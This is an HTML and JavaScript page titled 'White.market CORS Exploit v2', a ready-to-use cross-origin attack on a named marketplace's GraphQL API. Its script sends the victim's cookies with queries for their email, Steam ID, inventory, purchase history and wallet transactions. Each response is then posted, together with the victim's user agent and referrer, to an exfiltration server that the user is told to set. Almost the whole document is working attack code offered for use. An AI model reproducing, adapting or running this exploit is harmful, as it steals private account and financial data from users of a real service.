<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>White.market CORS Exploit v2 - Validated Queries</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff00;
            padding: 20px;
            max-width: 1400px;
            margin: 0 auto;
        }
        h1 { color: #ff0000; text-align: center; }
        .section { 
            background: #1a1a1a; 
            border: 1px solid #333; 
            padding: 15px; 
            margin: 15px 0;
            border-radius: 5px;
        }
        .success { color: #00ff00; }
        .fail { color: #ff0000; }
        pre {
            background: #000;
            padding: 10px;
            overflow-x: auto;
            border-left: 3px solid #00ff00;
            max-height: 300px;
            overflow-y: scroll;
        }
        button {
            background: #ff0000;
            color: #fff;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            margin: 5px;
        }
        .stat {
            display: inline-block;
            margin: 10px 20px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <h1>üéØ White.market CORS Exploit v2</h1>
    <h3 style="text-align: center; color: #ffaa00;">Using Validated Query Patterns</h3>
    
    <div class="section">
        <h2>üìä Statistics</h2>
        <div class="stat success">Successful: <span id="success">0</span></div>
        <div class="stat fail">Failed: <span id="fail">0</span></div>
        <div class="stat" style="color: #ffaa00;">Data: <span id="data">0</span> KB</div>
    </div>

    <div class="section">
        <button onclick="runAllQueries()">üöÄ RUN ALL QUERIES</button>
        <button onclick="clearResults()">Clear</button>
    </div>

    <div class="section">
        <h2>üì° Results</h2>
        <div id="results"></div>
    </div>

    <script>
    const CONFIG = {
        endpoint: 'https://api.white.market/graphql/api',
        exfilServer: 'http://0.0.0.0:5000/exfil', // Update with your server
        delay: 500
    };

    let stats = { success: 0, fail: 0, dataKB: 0 };

    // Based on your working example - these patterns are CONFIRMED to work
    const QUERIES = {
        market_list: {
            name: "Market Product List",
            query: `
                query MarketList($search: MarketProductSearchInput, $pagination: ForwardPaginationInput) {
                    market_list(search: $search, forwardPagination: $pagination) {
                        totalCount
                        pageInfo {
                            hasNextPage
                            endCursor
                        }
                        edges {
                            node {
                                id
                                price {
                                    value
                                    currency
                                }
                                slug
                                deliveryPromise
                                offerType
                                isSuperDeal
                                item {
                                    appId
                                    id
                                    description {
                                        name
                                        icon
                                        isTradeable
                                    }
                                }
                            }
                        }
                    }
                }
            `,
            variables: {
                pagination: { first: 50 }
            }
        },

        // Try similar patterns for other endpoints
        market_deal_list: {
            name: "User Purchase History",
            query: `
                query MarketDeals($search: MarketDealSearchInput, $pagination: ForwardPaginationInput) {
                    market_deal_list(search: $search, forwardPagination: $pagination) {
                        totalCount
                        edges {
                            node {
                                id
                                status
                                price {
                                    value
                                    currency
                                }
                                createdAt
                            }
                        }
                    }
                }
            `,
            variables: {
                pagination: { first: 50 }
            }
        },

        person_inventory: {
            name: "User Inventory",
            query: `
                query PersonInventory($search: PersonInventorySearchInput, $pagination: ForwardPaginationInput) {
                    person_inventory(search: $search, forwardPagination: $pagination) {
                        totalCount
                        totalCost {
                            value
                            currency
                        }
                        edges {
                            node {
                                id
                                item {
                                    appId
                                    description {
                                        name
                                        icon
                                    }
                                }
                            }
                        }
                    }
                }
            `,
            variables: {
                pagination: { first: 100 }
            }
        },

        wallet_transaction_list: {
            name: "Transaction History",
            query: `
                query WalletTransactions($search: WalletTransactionSearchInput, $pagination: ForwardPaginationInput) {
                    wallet_transaction_list(search: $search, forwardPagination: $pagination) {
                        totalCount
                        edges {
                            node {
                                id
                                amount {
                                    value
                                    currency
                                }
                                status
                                reason
                                createdAt
                            }
                        }
                    }
                }
            `,
            variables: {
                pagination: { first: 50 }
            }
        },

        person_full: {
            name: "User Profile",
            query: `
                query PersonFull {
                    person_full {
                        id
                        username
                        email
                        steamId
                    }
                }
            `
        },

        person_stats: {
            name: "User Statistics",
            query: `
                query PersonStats {
                    person_stats {
                        totals {
                            sold
                            bought
                        }
                    }
                }
            `
        }
    };

    async function executeQuery(key, queryObj) {
        try {
            const payload = {
                query: queryObj.query,
                variables: queryObj.variables || {},
                operationName: queryObj.name.replace(/\s+/g, '')
            };

            const response = await fetch(CONFIG.endpoint, {
                method: 'POST',
                credentials: 'include', // Send cookies!
                headers: {
                    'Content-Type': 'application/json',
                    'x-accept-language': 'en_US'
                },
                body: JSON.stringify(payload)
            });

            const data = await response.json();
            
            const success = response.ok && data.data && !data.errors;
            
            if (success) {
                stats.success++;
                const dataStr = JSON.stringify(data);
                stats.dataKB += (dataStr.length / 1024);
                
                // Exfiltrate
                try {
                    await fetch(CONFIG.exfilServer, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            timestamp: new Date().toISOString(),
                            queryKey: key,
                            queryName: queryObj.name,
                            data: data,
                            victim: {
                                userAgent: navigator.userAgent,
                                referrer: document.referrer
                            }
                        })
                    });
                } catch (e) {
                    console.warn('Exfil failed:', e.message);
                }
            } else {
                stats.fail++;
            }
            
            updateStats();
            logResult(queryObj.name, success, data);
            
            return { success, data };
            
        } catch (error) {
            stats.fail++;
            updateStats();
            logResult(queryObj.name, false, error.message);
            return { success: false, error: error.message };
        }
    }

    function logResult(name, success, data) {
        const div = document.createElement('div');
        div.className = 'section';
        
        const status = success ? '‚úÖ' : '‚ùå';
        const statusClass = success ? 'success' : 'fail';
        
        div.innerHTML = `
            <h3 class="${statusClass}">${status} ${name}</h3>
            <pre>${JSON.stringify(data, null, 2)}</pre>
        `;
        
        const results = document.getElementById('results');
        results.insertBefore(div, results.firstChild);
    }

    function updateStats() {
        document.getElementById('success').textContent = stats.success;
        document.getElementById('fail').textContent = stats.fail;
        document.getElementById('data').textContent = stats.dataKB.toFixed(2);
    }

    async function runAllQueries() {
        clearResults();
        
        console.log('[*] Starting exploitation...');
        
        for (const [key, queryObj] of Object.entries(QUERIES)) {
            console.log(`[*] Executing: ${queryObj.name}`);
            await executeQuery(key, queryObj);
            await new Promise(r => setTimeout(r, CONFIG.delay));
        }
        
        console.log('[+] Exploitation complete!');
        alert(`Complete!\nSuccessful: ${stats.success}\nFailed: ${stats.fail}\nData: ${stats.dataKB.toFixed(2)} KB`);
    }

    function clearResults() {
        document.getElementById('results').innerHTML = '';
        stats = { success: 0, fail: 0, dataKB: 0 };
        updateStats();
    }

    // Auto-run after 2 seconds
    setTimeout(() => {
        console.log('[*] Auto-starting in 2 seconds...');
        // Uncomment to auto-run:
        // setTimeout(runAllQueries, 2000);
    }, 1000);
    </script>
</body>
</html>
